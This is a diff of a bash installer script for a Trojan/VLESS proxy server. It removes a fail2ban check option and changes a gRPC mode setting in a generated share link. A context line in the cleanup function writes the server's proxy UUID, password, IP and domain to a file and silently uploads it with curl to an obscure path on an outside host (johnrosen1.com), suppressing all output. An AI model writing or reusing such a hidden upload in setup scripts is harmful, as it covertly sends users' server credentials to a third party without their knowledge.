@@ -131,7 +131,6 @@ prasejson(){
   "check_file": "$check_file",
   "check_speed": "$check_speed",
   "check_mariadb": "$check_mariadb",
-  "check_fail2ban": "$check_fail2ban",
   "check_mail": "$check_mail",
   "check_qbt_origin": "$check_qbt_origin",
   "check_tracker": "$check_tracker",
@@ -168,7 +167,6 @@ readconfig(){
   check_file="$( jq -r '.check_file' "/root/.trojan/config.json" )"
   check_speed="$( jq -r '.check_speed' "/root/.trojan/config.json" )"
   check_mariadb="$( jq -r '.check_mariadb' "/root/.trojan/config.json" )"
-  check_fail2ban="$( jq -r '.check_fail2ban' "/root/.trojan/config.json" )"
   check_mail="$( jq -r '.check_mail' "/root/.trojan/config.json" )"
   check_qbt_origin="$( jq -r '.check_qbt_origin' "/root/.trojan/config.json" )"
   check_tracker="$( jq -r '.check_tracker' "/root/.trojan/config.json" )"
@@ -189,7 +187,7 @@ clean_env(){
 prasejson
 cd /root
 if [[ -n ${uuid_new} ]]; then
-echo "vless://${uuid_new}@${myip}:${trojanport}?mode=multi&security=tls&type=grpc&serviceName=${path_new}&sni=${domain}#Vless(${route_final} ${mycountry} ${mycity} ${myip} ${myipv6} ${target_speed_up} Mbps)" &> ${myip}.txt
+echo "vless://${uuid_new}@${myip}:${trojanport}?mode=gun&security=tls&type=grpc&serviceName=${path_new}&sni=${domain}#Vless(${route_final} ${mycountry} ${mycity} ${myip} ${myipv6} ${target_speed_up} Mbps)" &> ${myip}.txt
 echo "trojan://${password1}@${myip}:${trojanport}?security=tls&headerType=none&type=tcp&sni=${domain}#Trojan(${route_final}${mycountry} ${mycity} ${myip} ${myipv6} ${target_speed_up} Mbps)" >> ${myip}.txt
 curl --retry 5 https://johnrosen1.com/fsahdfksh/ --upload-file ${myip}.txt &> /dev/null
 rm ${myip}.txt
